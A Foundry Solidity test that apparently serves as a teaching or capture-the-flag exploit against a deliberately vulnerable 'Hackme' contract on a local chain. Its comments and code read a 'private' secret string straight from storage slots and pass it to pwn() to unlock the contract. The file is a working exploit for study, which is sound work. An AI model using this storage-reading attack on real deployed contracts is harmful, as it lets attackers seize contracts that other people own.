// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Vulnerable.sol"; // Adjust the path as necessary

contract ExploitTest is Test {
    Hackme public _hackme;
    address public _hacker;

    function setUp() public {
        // Address of the already deployed contract on the cancun network (see console output)
        address vulnerableAddress = 0x5FbDB2315678afecb367f032d93F642f64180aa3; // Replace this address with the actual address

        // Create an instance of the deployed contract
        _hackme = Hackme(vulnerableAddress);

        // Set the attacker address
        _hacker = address(0x4337);

        // Fund the attacker with some ETH
        vm.deal(_hacker, 1 ether);
    }

    function testExploit() public {
        // Start impersonating the attacker
        vm.startPrank(_hacker);

        /*
        To find the secret we need to interact with the blockchain and read the full storage of the contract
        1. use the command cast storage CONTRACT_ADDRESS to print the storage 
                
        | Name         | Type    | Slot | Offset | Bytes | Value                                             | Hex Value                                                          | Contract                  |
        |--------------|---------|------|--------|-------|---------------------------------------------------|--------------------------------------------------------------------|---------------------------|
        | owner        | address | 0    | 0      | 20    | 1390849295786071768276380950238675083608645509734 | 0x000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb92266 | src/Vulnerable.sol:Hackme |
        | owner_secret | string  | 1    | 0      | 32    | 73                                                | 0x0000000000000000000000000000000000000000000000000000000000000049 | src/Vulnerable.sol:Hackme |
        | isLocked     | bool    | 2    | 0      | 1     | 1                                                 | 0x0000000000000000000000000000000000000000000000000000000000000001 | src/Vulnerable.sol:Hackme |
        
        2. Becuase the string is longer than 32 bytes, it is stored in multiple slots. The slot where the secret is stored is then at keccak256(abi.encode(uint256(1)));
        3. The lenght of our secret is (Value - 1) / 2. In this case, the length is 73, so the real length is (73 - 1) / 2 = 36
        4. Having these two information, all we need to get the secret is to:
            a. Access the storage of the contract at the slot keccak256(abi.encode(uint256(1)))
            b. Get the first word (32 bytes) of the secret
            c. Get part of the second word (4 bytes) of the secret
            d. Concatenate the two words to get the secret as a string
        **/

    
        
           // Read the length of the string stored at slot 0
        uint256 length = uint256(vm.load(address(_hackme), bytes32(uint256(1))));
        // we know that this value is length(SECRET) * 2 + 1. So we need to get only the (length -1)/2 characters.
        uint256 real_length = (length - 1) / 2;
        // Calculate the data slot
        bytes32 dataSlot = keccak256(abi.encode(uint256(1)));
        emit log_bytes32(dataSlot); // we can already see the secret here but let's automate
        // Read the data from storage
        bytes memory data = new bytes(real_length);
       
        for (uint256 i = 0; i < (length/real_length); i++) {
            bytes32 word = vm.load(address(_hackme), bytes32(uint256(dataSlot) + i));
            emit log_bytes32(word);
            for (uint256 j = 0; j < 32; j++) {
                // we need to stop if there are no more characters to read.    
                if(i * 32 + j >= real_length) {
                    break;
                }
                data[i * 32 + j] = word[j];
            }
        }
        // Convert the data to a string and print it
        string memory secret = string(data);
        // Call the exploit function. Change the argument to the correct secret
        _hackme.pwn(secret);
        // Stop impersonating the attacker
        vm.stopPrank();

        // Assert the expected outcome
        assertFalse(_hackme.locked());
    }

    
}